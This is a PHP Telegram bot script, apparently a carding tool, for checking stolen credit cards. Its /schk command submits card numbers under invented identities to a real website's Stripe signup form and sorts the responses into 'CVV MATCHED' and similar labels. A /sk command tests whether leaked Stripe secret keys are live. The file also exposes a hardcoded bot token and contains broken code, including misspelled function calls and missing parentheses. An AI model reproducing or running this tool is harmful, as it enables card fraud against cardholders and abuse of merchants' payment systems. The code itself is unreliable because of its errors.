<?php

////////////////=============[Zeltrax Bot Raw]=============////////////////
////////==========[Join @sohamnavale1 and @ZeltraxChat for more]==========////////

$botToken = "1558403824:AAE3iujmtZ68RpcWgHD8RoAOEpercwcGflY"; // Enter ur bot token
$website = "https://api.telegram.org/bot".$botToken;
error_reporting(0);
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
$chatId = $update["message"]["chat"]["id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$message = $update["message"]["text"];
$message_id = $update["message"]["message_id"];

//////////=========[Start Command]=========//////////

if (strpos($message, "/start") === 0){
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0ABot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}

//////////=========[Cmds Command]=========//////////

elseif (strpos($message, "/cmds") === 0){
sendMessage($chatId, "<u>Bin lookup:</u> <code>/bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>/sk</code> sk_live_TeamZeltrax%0A<u>Merchant CC Checker:</u> <code>/chk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Web Based CC Checker:</u> <code>/schk</code> xxxxxxxxxxxxxxxx|xx|xx|xxx%0A<u>Zee5 Checker:</u> <code>/zee5</code> Email:Pass%0A<u>Info:</u> <code>/info</code> To know ur info%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}

//////////=========[Info Command]=========//////////

//////////=========[Bin Command]=========//////////

elseif (strpos($message, "/bin") === 0){
$bin = substr($message, 5);
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>', $message_id);
}

//////////=========[Chk Command]=========//////////


//////////=========[Conpay Command]=========//////////

//////////=========[Schk (1req) Command]=========//////////

elseif (strpos($message, "/schk") === 0){
$lista = substr($message, 6);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country1 = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat='.$country1.'');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$country = value($resposta, '"nat":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://canadianteachermagazine.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: canadianteachermagazine.com',
'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: en-US,en;q=0.9',
'content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'origin: https://canadianteachermagazine.com',
'referer: https://canadianteachermagazine.com/register/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin'));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,  'action=arm_membership_setup_form_ajax_action&form_random_key=1_x8YM5HVtHA&setup_id=1&setup_action=membership_setup&arm_user_old_plan=0&arm_is_user_logged_in_flag=0&arm_front_plan_skin_type=&subscription_plan=2&arm_plan_type=recurring&arm_payment_cycle_plan_3=0&payment_cycle_3=0&user_login='.$firstname.'cufhba&first_name='.$firstname.'juiowd+&last_name='.$lastname.'fhsbcub&user_email='.$firstname.'bubub@gmail.com&user_pass=soham%409205&arm_action=please-signup&redirect_to=https%3A%2F%2Fcanadianteachermagazine.com&isAdmin=0&referral_url=https%3A%2F%2Fcanadianteachermagazine.com&arm_form_id=101&form_filter_kp=211&form_filter_st=1610618889&arm_nonce_check='.$nonce.'&arm_front_gateway_skin_type=radio&payment_gateway=stripe&arm_payment_mode%5Bstripe%5D=both&stripe%5Bcard_holder_name%5D='.$firstname.'baxiu+'.$lastname.'sciu&stripe%5Bcard_number%5D='.$cc.'&stripe%5Bexp_month%5D='.$mon.'&stripe%5Bexp_year%5D='.$year.'&stripe%5Bcvc%5D='.$cvv.'&arm_selected_payment_mode=auto_debit_subscription&arm_total_payable_amount=9.99&arm_zero_amount_discount=0.00&gqptwq87=');
$result = curl_exec($ch);

$nonce = trim(strip_tags(getstr($result,'"arm_nonce_check":"','"')));

//////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(strpos($result, "Your card required Stripe 3D authentication. Recommend to use Stripe SCA Method")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CVV MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strpos($result, "security code is incorrect.")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strpos($result, "Your card has insufficient funds.")){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>CCN MATCHED</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result, "Your card has expired."){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Has Expired</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result, "Your card number is incorrect."){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Number Is Incorrect</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result, "Your card was declined."){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Card Has Been Declined</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strops($result, "Your card does not support this type of purchase."){
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u> <b>Does Not Support Purchase</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
else{
sendMessage($chatId, "<b>Card:</b> <code>$lista</code>%0A<u>Response:</u><b>Error Not listed</b>%0A<b>Bank:</b> $bank%0A<b>Country:</b> $name%0A<b>Brand:</b> $brand%0A<b>Card:</b> $scheme%0A<b>Type:</b> $type%0A<u>Checked By:</u> @$username%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
};
// Add more responses if you want
curl_close($ch);
}

//////////=========[Sk Key Check Command]=========//////////

elseif (strpos($message, "/sk") === 0){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Soham Navale @sohamnavale1</b>", $message_id);
};}

//////////=========[Zee5 Command]=========//////////

////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message, $message_id){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);
};

////////////////=============[Soham Navale]=============////////////////
////////==========[Join @sohamnavale1 and @ZeltraxChat for more]==========////////

?>
